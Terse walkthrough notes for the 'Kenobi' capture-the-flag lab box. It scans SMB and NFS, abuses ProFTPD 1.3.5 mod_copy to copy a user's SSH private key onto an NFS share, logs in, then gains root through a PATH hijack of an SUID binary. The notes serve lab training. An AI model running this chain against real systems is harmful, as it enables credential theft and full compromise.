## Kenobi ##

nmap 10.10.255.67 -Pn -sV
** Vulnerable service: ProFTPD 1.3.5

 ** Port:21 -FTP
searchsploit -w ProFTPD 1.3.5
** ProFTPd 1.3.5 - File Copy
** https://www.exploit-db.com/exploits/36742


** Port:139,445 -smb
ls /usr/share/nmap/scripts | grep "smb"
** smb-enum-shares.nse
** smb-enum-users.nse
nmap 10.10.255.67 -Pn -sV --script "smb-enum-shares.nse,smb-enum-users.nse"

** smbclient
smbclient //10.10.255.67/anonymous
** Use own Kali root password
ls
pwd


** Port:111 -rpcbind -nfs
ls /usr/share/nmap/scripts | grep "nfs"
** nfs-ls.nse
** nfs-showmount.nse
** nfs-statfs.nse
nmap 10.10.255.67 -Pn -sV --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse


** Port:21 -FTP
** Vulnerable service: ProFTPD 1.3.5

searchsploit -w ProFTPD 1.3.5
** ProFTPd 1.3.5 - File Copy
** https://www.exploit-db.com/exploits/36742

** SITE CPFR source-path
** SITE CPTO destination-path 

nc 10.10.255.67 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
CTRL + Z

mkdir /mnt/kenobi_SSH_Private_Key
mount 10.10.255.67:/var /mnt/kenobi_SSH_Private_Key 
cd /mnt/kenobi_SSH_Private_Key/tmp
ls
chmod 600 id_rsa

** Use SSH private key to login
ssh -i id_rsa kenobi@10.10.255.67     

*** Access Gained

*** Privilege Escalation

** For SUID bit permitted files:
find / -perm -u=s -type f 2>/dev/null

** Out of the ordinary binary: /usr/bin/menu
menu
Ctrl + z

echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
1
id ----root



















